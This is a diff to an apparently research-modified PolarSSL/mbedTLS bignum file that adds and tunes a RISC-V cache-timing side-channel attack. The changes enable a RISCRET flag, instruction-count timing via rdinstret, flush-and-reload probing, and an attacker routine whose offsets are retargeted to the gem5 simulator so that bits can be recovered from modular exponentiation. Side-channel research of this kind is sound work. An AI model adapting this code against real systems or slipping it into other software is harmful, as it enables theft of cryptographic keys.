@@ -33,6 +33,7 @@
 #include <setjmp.h>
 #include <signal.h>
 #include "../../attack_offsets.h"
+#define RISCRET               //////////////////////////////////////////////////////////////////////////////////
 #endif
 
 #if !defined(POLARSSL_CONFIG_FILE)
@@ -1533,13 +1534,19 @@ static void mpi_montred( mpi *A, const mpi *N, t_uint mm, const mpi *T )
 // BEGIN ATTACK
 //
 
-#ifndef RISCRET
+// #ifndef RISCRET
+// static inline size_t rdinstret() {
+//         size_t val;
+//         asm volatile("rdinstret %0" : "=r"(val));
+//         return val;
+// }
+// #endif
+
+
 static inline size_t rdinstret() {
         size_t val;
         asm volatile("rdinstret %0" : "=r"(val));
-        return val;
-}
-#endif
+        return val;}
 
 static jmp_buf trycatch_buf;
 void unblock_signal(int signum __attribute__((__unused__))) {
@@ -1613,6 +1620,17 @@ void instant_ret() {
 }
 
 #ifdef RISCRET
+int print_riscret(){
+printf("RISCRET IS DEFINED\n");
+
+}
+#else
+int print_riscret(){
+printf("RISCRET IS NOT DEFINED\n");
+}
+#endif
+
+#ifdef RISCRET
 int flush_reload_t(void *ptr) {
   uint64_t s1 = 0, s2 = 0;
 
@@ -1645,11 +1663,13 @@ size_t CACHE_MISS = -1;
 
 #ifdef RISCRET
 //#define ONE_OFFSET 0x1b7c2 // for scifive
-#define ONE_OFFSET 0x1b7a0 // for allwinner
+// #define ONE_OFFSET 0x1b7a0 // for allwinner
+#define ONE_OFFSET 0x1d78e// for gem5
 #endif
 size_t bit_idx = 0;
 FILE* fd;
 void attacker(int ei) {
+// print_riscret();
   size_t mbedtls_libbase = (size_t) (mpi_exp_mod) - MPI_EXP_MOD_OFFSET;
   if (mbedtls_libbase & 0xfff != 0) {
     printf("offsets are wrong\n");
